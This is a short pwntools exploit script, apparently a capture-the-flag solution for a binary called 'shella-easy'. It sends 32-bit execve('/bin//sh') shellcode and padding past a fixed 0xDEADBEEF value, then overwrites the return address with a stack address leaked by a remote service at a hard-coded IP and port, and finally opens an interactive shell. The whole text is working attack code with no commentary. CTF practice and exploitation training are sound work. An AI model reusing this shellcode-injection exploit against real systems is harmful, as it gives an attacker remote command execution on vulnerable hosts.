from pwn import *


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = shellcode
payload += "A"*(0x40-len(payload))
payload += p32(0xDEADBEEF)
payload += "A"*8

#p = process("./shella-easy")
p = remote("52.15.182.55", 12345)
resp = p.recv()
print resp
addr = resp.split(" ")[4]
print "shellcode addr: " + addr

payload += p32(int(addr, 16))

p.sendline(payload)

p.interactive()


